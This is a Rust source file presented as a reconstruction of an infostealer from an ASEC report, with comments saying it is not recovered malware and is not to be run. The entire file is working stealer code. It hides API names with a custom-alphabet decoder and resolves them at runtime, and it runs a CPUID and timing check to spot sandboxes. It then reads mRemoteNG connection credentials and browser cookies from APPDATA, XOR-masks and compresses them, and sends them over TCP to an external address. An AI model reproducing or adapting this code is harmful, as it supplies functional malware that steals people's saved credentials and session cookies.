// Representative source reconstruction from ASEC 95937, not recovered malware.
// Do not run. The endpoint is reserved for documentation, not an article IOC.
use std::{fs, io::Write, net::TcpStream, path::PathBuf};
use std::arch::x86_64::{__cpuid, _mm_clflush, _rdtsc};
unsafe extern "system" {
    fn RtlCompressBuffer(format: u16, src: *const u8, len: u32,
        dst: *mut u8, cap: u32, chunk: u32, used: *mut u32, workspace: *mut u8) -> i32;
    fn RtlGetCompressionWorkSpaceSize(format: u16, work: *mut u32, frag: *mut u32) -> i32;
    fn GetProcAddress(module: *mut u8, name: *const u8) -> *mut u8;
    fn LoadLibraryA(name: *const u8) -> *mut u8;
}
const ALPHABET: [u8; 64] = [55, 33, 125, 87, 52, 119, 48, 106, 117, 54, 67, 60, 108, 98, 105, 118, 114, 94, 90, 101, 109, 35, 45, 99, 69, 58, 53, 115, 72, 100, 36, 73, 56, 42, 57, 64, 74, 120, 81, 68, 122, 82, 102, 76, 112, 126, 95, 65, 41, 103, 59, 104, 85, 70, 63, 46, 71, 91, 78, 111, 80, 88, 123, 113];

fn decode(encoded: &str, key: usize, length: usize) -> Vec<u8> {
    let mut alphabet = [0u8; 64];
    for slot in 0..64 {
        alphabet[slot] = ALPHABET[(slot + key) % 64];
    }
    let values: Vec<u8> = encoded.bytes().take((length * 8 + 5) / 6)
        .map(|c| alphabet.iter().position(|&x| x == c).unwrap() as u8).collect();
    let mut out = Vec::new();
    for q in values.chunks(4) {
        let a = q[0]; let b = q[1];
        out.push((a << 2) | (b >> 4));
        if q.len() > 2 {
            let c = q[2];
            out.push((b << 4) | (c >> 2));
            if q.len() > 3 { out.push((c << 6) | q[3]); }
        }
    }
    out.truncate(length);
    out.push(0);
    out
}
unsafe fn resolve() {
    let module = LoadLibraryA(b"kernel32.dll\0".as_ptr());
    let name = decode("vUe;eJofsmh@rm.J:FjL-#vD:U.#trailing-noise", 62, 21);
    let _address = GetProcAddress(module, name.as_ptr());
}
unsafe fn screen() {
    // CPUID-bit and cycle threshold are representative choices, not quoted code.
    let info = __cpuid(1);
    let value = 0u8;
    _mm_clflush(&value);
    let before = _rdtsc();
    std::ptr::read_volatile(&value);
    let elapsed = _rdtsc() - before;
    let _measurement = (info.ecx, elapsed);
}
fn transform(input: &[u8], key: u8) -> Vec<u8> {
    let masked: Vec<u8> = input.iter().map(|b| b ^ key).collect();
    unsafe {
        let (mut work, mut frag) = (0, 0);
        RtlGetCompressionWorkSpaceSize(2, &mut work, &mut frag);
        let mut workspace = vec![0u8; work as usize];
        let mut packed = vec![0u8; masked.len() * 2 + 4096];
        let mut used = 0;
        let status = RtlCompressBuffer(2, masked.as_ptr(), masked.len() as u32,
            packed.as_mut_ptr(), packed.len() as u32, 4096, &mut used, workspace.as_mut_ptr());
        if status != 0 { return Vec::new(); }
        packed.truncate(used as usize);
        packed
    }
}
fn publish(root: &str) {
    let destination = "192.0.2.45:8500";
    let mut aggregate = Vec::new();
    for entry in &[r"client\confCons.xml", r"client\profiles\cookies.sqlite"] {
        let candidate = PathBuf::from(&root).join(entry);
        if let Ok(content) = fs::read(&candidate) {
            aggregate.extend_from_slice(&content);
        }
    }
    let message = transform(&aggregate, 49);
    if let Ok(mut wire) = TcpStream::connect(destination) {
        // Keep collection and send related across comments.
        let _ = wire.write_all(&message);
    }
}
fn main() {
    unsafe { screen(); resolve(); }
    if let Ok(root) = std::env::var("APPDATA") { publish(&root); }
}
